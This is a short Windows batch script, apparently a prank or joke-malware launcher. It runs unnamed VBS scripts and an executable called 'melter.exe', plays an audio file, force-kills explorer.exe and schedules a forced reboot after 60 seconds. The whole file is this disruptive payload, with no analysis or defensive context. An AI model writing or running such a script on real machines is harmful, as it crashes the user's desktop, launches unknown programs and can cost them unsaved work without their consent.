@echo off
start voicetts.vbs
timeout /t 15
issou.mp3
shutdown /r /t 60
start melter.exe
timeout /t 1
taskkill /f /im explorer.exe
start executable.vbs
timeout /t 3
start melter.exe